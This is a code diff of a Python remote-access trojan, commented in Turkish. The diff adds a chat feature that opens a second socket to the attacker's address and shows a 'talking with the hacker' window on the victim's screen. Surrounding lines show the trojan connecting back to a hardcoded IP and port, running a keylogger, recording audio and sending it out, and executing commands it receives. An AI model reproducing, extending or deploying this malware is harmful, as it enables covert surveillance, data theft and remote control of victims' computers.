@@ -12,9 +12,11 @@ import sys
 import shutil
 import cv2
 import sound_record
+import tkinter
 
 ip = "192.168.1.105" # Bu değerleri kendinize göre değiştirin.
 port = 4444 # Bu değerleri kendinize göre değiştirin.
+sohbet_port = 5555
 
 my_thread = threading.Thread(target=kg.kg_Start)
 my_thread.start()
@@ -135,6 +137,40 @@ class Soket_baglanti():
         self.ses_kayit_basla = sound_record.Recording()
         self.ses_kayit_basla.Start_Record()
 
+    def Sohbet_Mesaj_Gonder(self):
+        mesaj = self.mesaj_girisi.get()
+        self.mesajlar.insert(tkinter.END, "\n" + "Sen:" + mesaj)
+        self.chat_baglanti.send(mesaj.encode())
+        self.mesajlar.see("end")
+
+    def Sohbet_Mesaj_Al(self):
+        while True:
+            message = self.chat_baglanti.recv(1024).decode()
+            if message == "cikis":
+                self.chat_gui.destroy()
+            self.mesajlar.insert(tkinter.END, "\n" + "Hacker:" + message)
+            self.mesajlar.see("end")
+
+    def Sohbet(self):
+        self.chat_baglanti = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        self.chat_baglanti.connect((ip,sohbet_port))
+        self.chat_gui = tkinter.Tk()
+        self.chat_gui.resizable(False, False)
+        self.chat_gui.config(bg="#D9D8D7")
+        self.chat_gui.geometry("600x300")
+        self.chat_gui.title("Hacker ile konuşuyorsun.")
+        self.mesajlar = tkinter.Text(self.chat_gui, width=71, height=10, fg="#0E6B0E", bg="#000000")
+        self.mesajlar.place(x=0, y=0)
+        self.mesajlar.insert("1.0","Hacker seninle konuşmak istiyor.Mesajını 'Mesajınız' bölümüne yazıp buton ile gönder.")
+        self.mesajiniz_etiketi = tkinter.Label(self.chat_gui, width=20, text="Mesajınız :", fg="#0D1C6E")
+        self.mesajiniz_etiketi.place(x=-30, y=250)
+        self.mesaj_girisi = tkinter.Entry(self.chat_gui, width=50)
+        self.mesaj_girisi.place(x=90, y=250)
+        self.gonderme_butonu = tkinter.Button(self.chat_gui, width=20, text="Mesaj Gönder", command=self.Sohbet_Mesaj_Gonder, bg="#000000", fg="#0E6B0E")
+        self.gonderme_butonu.place(x=400, y=245)
+        self.chat_thread = threading.Thread(target=self.Sohbet_Mesaj_Al)
+        self.chat_thread.start()
+        self.chat_gui.mainloop()
 
     def Soket_Basla(self):
         while True:
@@ -209,7 +245,8 @@ class Soket_baglanti():
                     self.ses_kayit_basla.Stop_Record()
                     komut_cikisi = self.Dosya_Icerigi_Al(self.ses_dosyasi)
                     os.remove(self.ses_dosyasi)
-
+                elif komut[0] == "sohbet":
+                    self.Sohbet()
                 else:
                     komut_cikisi = self.Komut_Calistir(komut)
             except Exception:
